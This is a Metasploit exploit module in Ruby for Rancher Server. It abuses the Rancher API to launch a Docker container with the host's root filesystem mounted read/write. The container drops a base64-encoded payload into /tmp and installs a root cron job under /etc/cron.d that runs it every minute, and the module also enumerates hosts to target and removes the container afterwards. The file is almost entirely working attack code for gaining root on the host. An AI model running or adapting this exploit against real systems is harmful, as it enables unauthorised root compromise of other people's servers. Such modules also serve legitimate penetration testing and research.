# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;             => &#039;Rancher Server - Docker Exploit&#039;,
      &#039;Description&#039;      => %q(
        Utilizing Rancher Server, an attacker can create a docker container
        with the &#039;/&#039; path mounted with read/write permissions on the host
        server that is running the docker container. As the docker container
        executes command as uid 0 it is honored by the host operating system
        allowing the attacker to edit/create files owed by root. This exploit
        abuses this to creates a cron job in the &#039;/etc/cron.d/&#039; path of the
        host server.

        The Docker image should exist on the target system or be a valid image
        from hub.docker.com.

        Use `check` with verbose mode to get a list of exploitable Rancher
        Hosts managed by the target system.
      ),
      &#039;Author&#039;           => &#039;Martin Pizala&#039;, # started with dcos_marathon module from Erik Daguerre
      &#039;License&#039;          => MSF_LICENSE,
      &#039;References&#039;       => [
        &#039;URL&#039;            => &#039;https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface&#039;
      ],
      &#039;Platform&#039;         => &#039;linux&#039;,
      &#039;Arch&#039;             => [ARCH_X64],
      &#039;Payload&#039;          => { &#039;Space&#039; => 65000 },
      &#039;Targets&#039;          => [[ &#039;Linux&#039;, {} ]],
      &#039;DefaultTarget&#039;    => 0,
      &#039;DisclosureDate&#039;   => &#039;Jul 27, 2017&#039;))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(&#039;TARGETENV&#039;, [ true, &#039;Target Rancher Environment&#039;, &#039;1a5&#039; ]),
        OptString.new(&#039;TARGETHOST&#039;, [ true, &#039;Target Rancher Host&#039;, &#039;1h1&#039; ]),
        OptString.new(&#039;DOCKERIMAGE&#039;, [ true, &#039;hub.docker.com image to use&#039;, &#039;alpine:latest&#039; ]),
        OptString.new(&#039;CONTAINER_ID&#039;, [ false, &#039;container id you would like&#039;]),
        OptString.new(&#039;HttpUsername&#039;, [false, &#039;Rancher API Access Key (Username)&#039;]),
        OptString.new(&#039;HttpPassword&#039;, [false, &#039;Rancher API Secret Key (Password)&#039;])
      ]
    )
    register_advanced_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Rancher API Path&#039;, &#039;/v1/projects&#039; ]),
        OptInt.new(&#039;WAIT_TIMEOUT&#039;, [ true, &#039;Time in seconds to wait for the docker container to deploy&#039;, 60 ])
      ]
    )
  end

  def del_container(rancher_container_id, container_id)
    res = send_request_cgi(
      &#039;method&#039;  => &#039;DELETE&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path, datastore[&#039;TARGETENV&#039;], &#039;containers&#039;, rancher_container_id),
      &#039;ctype&#039;   => &#039;application/json&#039;,
      &#039;headers&#039; => { &#039;Accept&#039; => &#039;application/json&#039; }
    )

    return vprint_good(&#039;The docker container has been removed.&#039;) if res && res.code == 200

    print_warning("Manual cleanup of container \"#{container_id}\" is needed on the target.")
  end

  def make_container_id
    return datastore[&#039;CONTAINER_ID&#039;] unless datastore[&#039;CONTAINER_ID&#039;].nil?

    rand_text_alpha_lower(8)
  end

  def make_cmd(mnt_path, cron_path, payload_path)
    vprint_status(&#039;Creating the docker container command&#039;)
    echo_cron_path = mnt_path + cron_path
    echo_payload_path = mnt_path + payload_path

    command = "echo #{Rex::Text.encode_base64(payload.encoded_exe)} | base64 -d > #{echo_payload_path} \&\& chmod +x #{echo_payload_path} \&\& "
    command << "echo \"PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin\" >> #{echo_cron_path} \&\& "
    command << "echo \"\" >> #{echo_cron_path} \&\& "
    command << "echo \"* * * * * root #{payload_path}\" >> #{echo_cron_path}"

    command
  end

  def make_container(mnt_path, cron_path, payload_path, container_id)
    vprint_status(&#039;Setting container json request variables&#039;)
    {
      &#039;instanceTriggeredStop&#039;           => &#039;stop&#039;,
      &#039;startOnCreate&#039;                   => true,
      &#039;networkMode&#039;                     => &#039;managed&#039;,
      &#039;requestedHostId&#039;                 => datastore[&#039;TARGETHOST&#039;],
      &#039;type&#039;                            => &#039;container&#039;,
      &#039;dataVolumes&#039;                     => [ &#039;/:&#039; + mnt_path ],
      &#039;imageUuid&#039;                       => &#039;docker:&#039; + datastore[&#039;DOCKERIMAGE&#039;],
      &#039;name&#039;                            => container_id,
      &#039;command&#039;                         => make_cmd(mnt_path, cron_path, payload_path),
      &#039;entryPoint&#039;                      => %w[sh -c]
    }
  end

  def check
    res = send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path),
      &#039;ctype&#039;   => &#039;application/json&#039;,
      &#039;headers&#039; => { &#039;Accept&#039; => &#039;application/json&#039; }
    )

    if res.nil?
      print_error(&#039;Failed to connect to the target&#039;)
      return Exploit::CheckCode::Unknown
    end

    if res.code == 401 && res.headers.to_json.include?(&#039;X-Rancher-Version&#039;)
      print_error(&#039;Authorization is required. Provide valid Rancher API Keys.&#039;)
      return Exploit::CheckCode::Detected
    end

    if res.code == 200 && res.headers.to_json.include?(&#039;X-Rancher-Version&#039;)
      target_found = false
      target_selected = false

      environments = JSON.parse(res.body)[&#039;data&#039;]
      environments.each do |e|
        res = send_request_cgi(
          &#039;method&#039;  => &#039;GET&#039;,
          &#039;uri&#039;     => normalize_uri(target_uri.path, e[&#039;id&#039;], &#039;hosts&#039;),
          &#039;ctype&#039;   => &#039;application/json&#039;,
          &#039;headers&#039; => { &#039;Accept&#039; => &#039;application/json&#039; }
        )

        hosts = JSON.parse(res.body)[&#039;data&#039;]
        hosts.each do |h|
          target_found = true
          result = "Rancher Host \"#{h[&#039;hostname&#039;]}\" (TARGETHOST #{h[&#039;id&#039;]}) on "
          result << "Environment \"#{e[&#039;name&#039;]}\" (TARGETENV #{e[&#039;id&#039;]}) found"

          # flag results when this host is targeted via options
          if datastore[&#039;TARGETENV&#039;] == e[&#039;id&#039;] && datastore[&#039;TARGETHOST&#039;] == h[&#039;id&#039;]
            target_selected = true
            vprint_good(result + &#039; %red<-- targeted%clr&#039;)
          else
            vprint_good(result)
          end
        end
      end

      if target_found
        return Exploit::CheckCode::Vulnerable if target_selected

        print_bad("Your TARGETENV \"#{datastore[&#039;TARGETENV&#039;]}\" or/and TARGETHOST \"#{datastore[&#039;TARGETHOST&#039;]}\" is not available")
        if datastore[&#039;VERBOSE&#039;] == false
          print_bad(&#039;Try verbose mode to know what happened.&#039;)
        end
        vprint_bad(&#039;Choose a TARGETHOST and TARGETENV from the results above&#039;)
        return Exploit::CheckCode::Appears
      else
        print_bad(&#039;No TARGETHOST available&#039;)
        return Exploit::CheckCode::Detected
      end
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Failure::Unknown, &#039;Failed to connect to the target&#039;)
    end

    # create required information to create json container information
    cron_path = &#039;/etc/cron.d/&#039; + rand_text_alpha(8)
    payload_path = &#039;/tmp/&#039; + rand_text_alpha(8)
    mnt_path = &#039;/mnt/&#039; + rand_text_alpha(8)
    container_id = make_container_id

    # deploy docker container
    res = send_request_cgi(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path, datastore[&#039;TARGETENV&#039;], &#039;containers&#039;),
      &#039;ctype&#039;   => &#039;application/json&#039;,
      &#039;headers&#039; => { &#039;Accept&#039; => &#039;application/json&#039; },
      &#039;data&#039;    => make_container(mnt_path, cron_path, payload_path, container_id).to_json
    )
    fail_with(Failure::Unknown, &#039;Failed to create the docker container&#039;) unless res && res.code == 201

    print_good(&#039;The docker container is created, waiting for it to deploy&#039;)

    # cleanup
    register_files_for_cleanup(cron_path, payload_path)

    rancher_container_id = JSON.parse(res.body)[&#039;id&#039;]
    deleted_container = false

    sleep_time = 5
    wait_time = datastore[&#039;WAIT_TIMEOUT&#039;]
    vprint_status("Waiting up to #{wait_time} seconds until the docker container stops")

    while wait_time > 0
      sleep(sleep_time)
      wait_time -= sleep_time

      res = send_request_cgi(
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;uri&#039;     => normalize_uri(target_uri.path, datastore[&#039;TARGETENV&#039;], &#039;containers&#039;, &#039;?name=&#039; + container_id),
        &#039;ctype&#039;   => &#039;application/json&#039;,
        &#039;headers&#039; => { &#039;Accept&#039; => &#039;application/json&#039; }
      )
      next unless res && res.code == 200 && res.body.include?(&#039;stopped&#039;)

      vprint_good(&#039;The docker container has stopped, now trying to remove it&#039;)
      del_container(rancher_container_id, container_id)
      deleted_container = true
      wait_time = 0
    end

    # if container does not deploy, try to remove it and fail out
    unless deleted_container
      del_container(rancher_container_id, container_id)
      fail_with(Failure::Unknown, "The docker container failed to start")
    end

    print_status(&#039;Waiting for the cron job to run, can take up to 60 seconds&#039;)
  end
end

